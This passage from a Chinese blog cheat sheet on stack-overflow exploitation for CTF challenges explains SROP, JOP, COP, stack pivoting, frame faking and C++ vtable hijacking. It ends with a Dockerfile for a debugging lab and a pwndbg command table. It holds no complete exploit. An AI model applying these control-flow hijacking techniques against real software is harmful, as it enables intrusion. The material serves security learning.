class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> 由于整个 Signal Frame 都被保存在栈中，因此通过栈溢出我们可以读写对应的 Signal Frame，这时内核态执行完毕以后调用 sigreturn 恢复进程寄存器的时候，我们就可以控制 rip/eip 的值，劫持控制流，我们也可以手动调用 sigreturn 系统调用，然后在栈上伪造一个 Signal Frame，这样就可以控制所有寄存器的值。我们甚至可以伪造多个不同的 Signal Frame 执行不同的系统调用或函数，例如这个 Frame 可以调用 read，另一个调用 write 等等。</p><p> 实际上 pwntools 中已经集成了针对 SROP 的利用 <code>SigreturnFrame ()</code>，直接实例化一个这个类就可以很容易修改 Signal Frame 中寄存器的值，修改完成后将其转为 str 就得到了对应的 payload，直接 send 即可，非常方便。</p><h2 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h2><p>JOP 即 Jump-Oriented Programming（面向跳转编程），说白了就是只用 jmp 寄存器完成 getshell，例如 <code>pop rax; jmp rax</code>，大致原理与 ROP 相同。</p><h2 id="COP"><a href="#COP" class="headerlink" title="COP"></a>COP</h2><p>COP 即 Call-Oriented Programming（面向调用编程），说白了就是只用 call 寄存器完成 getshell，例如 <code>pop rax; call rax</code>，大致原理与 ROP 相同。</p><h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><p> 也称作栈迁移，如果可以控制栈顶指针 sp，就可以将栈迁移到其他可读写的地址，通常情况下我们虽然可以很容易控制 sp，但是其他方法就可以 getshell，所以一般用不到栈迁移，但是在某些极端情况下栈迁移也是非常有用的：</p><ol><li> 可以溢出的长度很少，无法构造较长的 rop 链 </li><li> 开启了 PIE，我们不知道栈地址，可以控制 sp 的话就可以将栈迁移到已知地址 </li><li> 甚至可以将栈迁移到堆空间结合堆溢出控制栈上的内容 </li></ol><p> 攻击前提：</p><ol><li> 可以劫持控制流 </li><li> 可以控制栈顶指针 sp，例如 <code>pop rsp; ret</code> 这类的 gadgets。其实万金油 csu 中就有现成的可以控制 sp 的 gadget，位置在偏移 + 3 处。</li></ol><h2 id="Frame-Faking"><a href="#Frame-Faking" class="headerlink" title="Frame Faking"></a>Frame Faking</h2><p> 顾名思义，伪造一个函数栈劫持控制流，其实和栈迁移一样，只不过是将栈底迁移到已知的可控地址处，利用 <code>leave; ret</code>gadgets 来劫持控制流，即如果栈底可控，那么通过 leave 指令，栈顶也就可控，ret 也可控。</p><p>leave 指令相当于 <code>move esp,ebp; pop ebp</code>，也就是 <code>esp=ebp &amp;&amp; ebp=old_ebp</code>，如果我们可以通过栈溢出修改 <code>old_ebp</code> 为我们可控的地址 <code>evil_ebp</code>，那么在执行 leave 的时候首先修改 esp 为 ebp，之后修改 ebp 为我们的 <code>evil_ebp</code>，现在栈底我们可控，之后执行 ret 指令，也就是 <code>leave; ret</code>gadget，这时又会执行一次 leave，esp 就变成了我们的 <code>evil_ebp</code>，那么这时候整个栈顶和栈底都到了我们可控的地址处，这时又修改 ebp 到其他地方（可以是我们控制的地方，不过已经无所谓了），然后执行 gadget 中的 ret 指令 ，但是这时整个栈都到了我们可控的地址处，也就是说我们可以任意控制栈上的内容，可以很容易构造其他 rop 链了。</p><p> 其实说白了，栈伪造就是栈迁移的升级版，其利用范围和栈迁移一样，但是攻击前提就需要寻找到一条 <code>levae; ret</code> 这样的 gadget，其实这种 gadget 很好找。栈伪造的原理如下所示，假设 0x0 开始是程序原本的栈，但是通过栈溢出我们只能修改 ebp 和 ret，这时无法构造长的 rop 链，但是我们修改 ebp 为 0x800010，也就是我们伪造的栈地址，修改 ret 为 0x400070，也就是 <code>leave; ret</code>gadget，执行完以后 <code>leave; ret</code>gadget 以后栈就会被迁移到 0x800010 处，这时我们就可以完全控制栈的内容了，可以构造任意长度的 rop 链。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x0 AAAA</span><br><span class="line">0x4 AAAA</span><br><span class="line">0x8 old_ebp (=0x80001a)</span><br><span class="line">0xc ret (=0x40075)</span><br><span class="line">...</span><br><span class="line">0x400070 leave; ret</span><br><span class="line">...</span><br><span class="line">0x800010 AAAA</span><br><span class="line">0x800014 gadgets_addr</span><br><span class="line">0x800018 gadgets_addr</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Other-Tricks"><a href="#Other-Tricks" class="headerlink" title="Other Tricks"></a>Other Tricks</h2><ol><li><p> 控制 rax/eax</p><p> 有时候系统调用需要我们控制 al 寄存器，但是类似 <code>pop rax/eax; ret</code> 这种 gadgets 很难找，这时若可以调用 alarm 函数，那么可以通过依次调用 alarm (x)，alarm (0) 即可将 rax 设置为 x，而很多题目都会设置一个 alarm 定时终止程序防止过多的 socket 连接占用资源。其实不止 alarm，其他函数在调用完成后也可能会修改部分寄存器的值。</p></li><li><p> 栈重叠 </p><p> 对于两个连续调用的函数，第一个函数执行完成后其栈桢被回收（即 esp=ebp），但是被回收的栈上保存的内容并不会被清空，这时开始执行第二个函数，开辟新的栈桢，第二个函数开辟的栈桢中某些未初始化的局部变量的默认值可能会受到第一个函数中未被清空的局部变量的影响 </p></li></ol><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p> 对于 C++ 的 pwn 大都针对于虚函数。C++ 支持多态与虚函数，基类的虚函数仅负责给出函数的定义，而该函数的具体实现由子类决定。由于在编译期间无法确定具体对象所调用的虚函数，因此 C++ 主要通过动态绑定的方法实现了虚函数，即在程序运行过程中根据对象的实际类型决定调用哪个虚函数。简而言之，虚函数的目的就是为了通过一个基类指针可以调用子类的同名函数，而这一功能在编译期间无法实现，主要通过虚表进行延迟绑定实现。</p><p> 每个包含虚函数的类都会有一个虚表（vtable），该类的所有对象共用一个虚表，虚表其实是一个指针数组，数组中每个元素都是一个指向一个虚函数的指针。虚表一般位于.rodata 段中，位于类的定义数据的起始位置，只读不可写。在程序编译的时候虚表内容就已经确定。若一个子类继承了包含虚函数的类，该子类也有一个虚表，虚表中的指针会指向其继承树中最近的一个类的虚函数。类的每一个对象都保存一个指向该对象所属类的虚表的指针 __vptr，当调用一个对象的虚函数的时候，通过该对象的虚表指针找到该类的虚表，之后在虚表中找到对应的函数地址并且调用。</p><p> 假设有如下继承关系。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::vfunc1 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::vfunc2 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::func1 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::func2 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;B::vfunc1 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;B::func1 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data3;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>: <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;C::vfunc2 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;C::func2 ()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    B b;</span><br><span class="line">    C c;</span><br><span class="line">    A *p;</span><br><span class="line">    </span><br><span class="line">    p = &amp;b;</span><br><span class="line">    p-&gt;<span class="built_in">func1</span>();  <span class="comment">// A::func1 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">func2</span>();  <span class="comment">// A::func2 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc1</span>();  <span class="comment">// B::vfunc1 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc2</span>();  <span class="comment">// A::vfunc2 ()</span></span><br><span class="line">    cout &lt;&lt; endl; </span><br><span class="line">    </span><br><span class="line">    p = &amp;c;</span><br><span class="line">    p-&gt;<span class="built_in">func1</span>();  <span class="comment">// A::func1 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">func2</span>();  <span class="comment">// A::func2 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc1</span>();  <span class="comment">// B::vfun1 ()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc2</span>();  <span class="comment">// C::vfun2 ()</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>p 是一个 A 类的指针，p 首先指向 B 的对象 b，此时 <code>b-&gt;__vptr</code> 指向 B 的虚表，在虚表中查询对应函数地址即可找到真正调用的函数。内存中 A，B，C 三个类的虚表如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/10.png"></p><p> 针对 C++ 的 pwn 基本都是劫持虚表，但是虚表本身不可写，所以可以劫持一个对象指向虚表的虚表指针。目前有两种主要的攻击手法：伪造虚表，让类的虚表指针指向伪造的一个虚表，或者修改虚表指针指向其他类的虚表。</p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p> 建议使用 Docker 搭建本地环境，方便调试程序，本人使用的 docker 环境的 dockerfile 如下 (Ubuntu 18.04)，其中包含了后文中的大部分离线工具 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y ca-certificates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> sources.list/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pip.conf/root/.pip/pip.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg --add-architecture i386 &amp;&amp; apt-get -y update &amp;&amp; apt install -y \</span></span><br><span class="line"><span class="language-bash">    zsh \</span></span><br><span class="line"><span class="language-bash">    seccomp \</span></span><br><span class="line"><span class="language-bash">    libseccomp-dev \</span></span><br><span class="line"><span class="language-bash">    libc6:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg \</span></span><br><span class="line"><span class="language-bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="language-bash">    g++-multilib \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    ipython3 \</span></span><br><span class="line"><span class="language-bash">    upx-ucl \</span></span><br><span class="line"><span class="language-bash">    vim \</span></span><br><span class="line"><span class="language-bash">    net-tools \</span></span><br><span class="line"><span class="language-bash">    iputils-ping \</span></span><br><span class="line"><span class="language-bash">    libffi-dev \</span></span><br><span class="line"><span class="language-bash">    libssl-dev \</span></span><br><span class="line"><span class="language-bash">    python3-dev \</span></span><br><span class="line"><span class="language-bash">    python3-pip \</span></span><br><span class="line"><span class="language-bash">    python-pip \</span></span><br><span class="line"><span class="language-bash">    build-essential \</span></span><br><span class="line"><span class="language-bash">    ruby \</span></span><br><span class="line"><span class="language-bash">    ruby-dev \</span></span><br><span class="line"><span class="language-bash">    tmux \</span></span><br><span class="line"><span class="language-bash">    strace \</span></span><br><span class="line"><span class="language-bash">    ltrace \</span></span><br><span class="line"><span class="language-bash">    nasm \</span></span><br><span class="line"><span class="language-bash">    wget \</span></span><br><span class="line"><span class="language-bash">    radare2 \</span></span><br><span class="line"><span class="language-bash">    gdb \</span></span><br><span class="line"><span class="language-bash">    gdb-multiarch \</span></span><br><span class="line"><span class="language-bash">    netcat \</span></span><br><span class="line"><span class="language-bash">    socat \</span></span><br><span class="line"><span class="language-bash">    python3-distutils \</span></span><br><span class="line"><span class="language-bash">    git \</span></span><br><span class="line"><span class="language-bash">    binwalk \</span></span><br><span class="line"><span class="language-bash">    patchelf \</span></span><br><span class="line"><span class="language-bash">    gawk \</span></span><br><span class="line"><span class="language-bash">    file \</span></span><br><span class="line"><span class="language-bash">    tree \</span></span><br><span class="line"><span class="language-bash">    bison --fix-missing &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip2 install --upgrade pip setuptools &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip2 install pathlib2 pwntools --no-cache-dir &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip3 install --upgrade pip setuptools &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip3 install --no-cache-dir --default-timeout=100 \</span></span><br><span class="line"><span class="language-bash">    ropgadget \</span></span><br><span class="line"><span class="language-bash">    pwntools \</span></span><br><span class="line"><span class="language-bash">    z3-solver \</span></span><br><span class="line"><span class="language-bash">    smmap2 \</span></span><br><span class="line"><span class="language-bash">    apscheduler \</span></span><br><span class="line"><span class="language-bash">    ropper \</span></span><br><span class="line"><span class="language-bash">    unicorn \</span></span><br><span class="line"><span class="language-bash">    keystone-engine \</span></span><br><span class="line"><span class="language-bash">    capstone \</span></span><br><span class="line"><span class="language-bash">    angr \</span></span><br><span class="line"><span class="language-bash">    pebble</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/--remove https://rubygems.org/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gem install one_gadget seccomp-tools zsteg &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/gems/2.*/cache/* </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/pwndbg/pwndbg ~/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cd</span> ~/pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cd</span> ~/Pwngdb &amp;&amp; <span class="built_in">cat</span> ~/Pwngdb/.gdbinit  &gt;&gt; ~/.gdbinit &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> ~/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/niklasb/libc-database.git ~/libc-database &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;~/libc-database/&quot;</span> &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/matrix1001/glibc-all-in-one ~/glibc-all-in-one </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s $(<span class="built_in">which</span> zsh) &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y locales &amp;&amp; locale-gen en_US &amp;&amp; locale-gen en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG=en_US.UTF-<span class="number">8</span>  </span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE=en_US:en  </span><br><span class="line"><span class="keyword">ENV</span> LC_ALL=en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p> 最常用的逆向工具，可以很方便的将汇编代码反编译为便于人类可读的伪代码。</p><h2 id="GDB-pwndbg"><a href="#GDB-pwndbg" class="headerlink" title="GDB/pwndbg"></a>GDB/pwndbg</h2><p>gdb 为 linux 自带的程序调试工具，但是原生的 gdb 非常难用，因此可以安装 pwndbg 插件增强 gdb 的功能，安装方法如下所示，在前文的 dockerfile 中集成了 pwndbg。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>pwndbd 文档为 <a href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a>。常用的 pwndbg 命令如下。</p><table><thead><tr><th align="center"> 命令 </th><th align="center"> 解释 </th></tr></thead><tbody><tr><td align="center">set args xxxx xxxx</td><td align="center"> 设置程序的 args 为 xxxx 和 xxxx</td></tr><tr><td align="center">vmmap</td><td align="center"> 查看程序的所有地址 </td></tr><tr><td align="center">run</td><td align="center"> 直接执行程序 </td></tr><tr><td align="center">start</td><td align="center"> 从头开始执行程序，相当于在第一行代码处下断点并且开始执行，通常这不会从 main 函数开始执行，而是 libc 中的 start</td></tr><tr><td align="center">b *0xxxxxxxx</td><td align="center"> 在地址 0xxxxxxxx 处下断点 </td></tr><tr><td align="center">b main</td><td align="center"> 在 main 函数的开始处下断点 </td></tr><tr><td align="center">b func+10</td><td align="center"> 在 func+10 处下断点 </td></tr><tr><td align="center">b func+10 if i == 1</td><td align="center"> 条件断点，gdb 必须可以找到变量 i</td></tr><tr><td align="center">d breakpoints</td><td align="center"> 删除所有断点 </td></tr><tr><td align="center">d breakpoints 1</td><td align="center"> 删除编号为 1 的断点 </td></tr><tr><td align="center">i breakpoints</td><td align="center"> 查看所有断点 </td></tr><tr><td align="center">i functions</td><td align="center"> 查看程序目前所有的函数名称与地址 </td></tr><tr><td align="center">attach 123</td><td align="center"> 挂载到进程号 123 的程序，通常和 pwntools 配合使用 </td></tr><tr><td align="center">stack</td><td align="center"> 查看栈上的东西 </td></tr><tr><td align="center">regs</td><td align="center"> 查看目前所有寄存器的值 </td></tr><tr><td align="center">got</td><td align="center"> 查看 got 表的信息 </td></tr><tr><td align="center">plt</td><td align="center"> 查看 plt 表的信息 </td></tr><tr><td align="center">heap</td><td align="center"> 查看堆上的 chunk</td></tr><tr><td align="center">heap_info</td><td align="center"> 查看 heap_info 的信息 </td></tr><tr><td align="center">arena</td><td align="center"> 查看所有 arena 的信息 </td></tr><tr><td align="center">bins</td><td align="center"> 查看所有 bin 的信息 </td></tr><tr><td align="center">tcache</td><td align="center"> 查看 tcache 的信息 </td></tr><tr><td align="center">fastbins</td><td align="center"> 查看 fastbins 所有的 chunk</td></tr><tr><td align="center">smallbins</td><td align="center"> 查看 smallbins 所有的 chunk</td></tr><tr><td align="center">largebins</td><td align="center"> 查看 largebins 所有的 chunk</td></tr><tr><td align="center">unsortedbin</td><td align="center"> 查看 unsortedbin 的所有 chunk</td></tr><tr><td align="center">top_chunk</td><td align="center"> 查看 top chunk 的信息 </td></tr><tr><td align="center">x/20xw 0xxxxx</td><td align="center"> 以十六进制，4 字节为单位打印 20 个该地址保存的值，32 位程序常用 </td></tr><tr><td align="center">x/20xh 0xxxxx</td><td align="center"> 以十六进制，2 字节为单位打印 20 个该地址保存的值 </td></tr><tr><td align="center">x/20xg 0xxxxx</td><td align="center"> 以十六进制，8 字节为单位打印 20 个该地址保存的值，64 位程序常用 </td></tr><tr><td align="center">x/20i 0xxxxx</td><td align="center"> 将该地址保存的值解析为指令打印 20 条 </td></tr><tr><td align="center">x/20s 0xxxxx</td><td align="center"> 将改地址保存的值解析为字符串打印 20 个 </td></tr><tr><td align="center">rop</td><td align="center"> 等同用使用 ropgadget</td></tr><tr><td align="center">ropper</td><td align="center"> 等同于使用 ropper</td></tr><tr><td align="center">checksec</td><td align="center"> 等同于使用 checksec，该命令来自 pwntools</td></tr><tr><td align="center">canary</td><td align="center"> 打印当前栈上的 canary</td></tr><tr><td align="center">retaddr</td><td align="center"> 打印当前站上的 ret 地址 </td></tr><tr><td align="center">distance 0xxxxx 0xxxxx</td><td align="center"> 计算两个地址之间的距离 </td></tr><tr><td align="center">cyclic 10</td><td align="center"> 生成 10 个字节 junk data，生成的 junk data 是有规律的，例如 aaabaaacaaad 等等，该命令来自 pwntools</td></tr></tbody></table><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p> 是一个专门为 pwn 而生的 python 库，其中集成了很多非常友好的 pwn 相关的 API 以及利用方法，很多手工利用很复杂的方法在 pwntools 中只需要一个函数就可以。</p><p> 